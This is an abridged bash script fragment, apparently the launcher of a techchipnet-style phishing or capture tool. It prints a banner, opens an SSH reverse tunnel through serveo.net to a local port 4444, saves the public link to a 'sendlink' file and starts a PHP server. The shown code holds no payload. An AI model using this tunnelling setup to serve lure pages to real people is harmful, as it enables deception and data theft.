#!/bin/bash
# RKTECHPRO v2.5
# Powered by RKTECHPRO
# Credits goes to the linux choice [github.com/Rktechpro/]
...
printf "^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^"
printf  "<P><><><><><><><><R><><><><><><><><><><><><><><><O><><><><><><>"
printf " \e[1;93m Rktechpro Ver 1.5 \e[0m \n"
printf " \e[1;77m www.Rktechpro.com | youtube.com/techchipnet \e[0m \n"
printf "\n"
...
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$subdomain':80:localhost:4444 serveo.net  2> /dev/null > sendlink ' &

sleep 8
else
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:4444 serveo.net 2> /dev/null > sendlink ' &

sleep 8
fi
printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Starting php server... (localhost:4444)\e[0m\n"
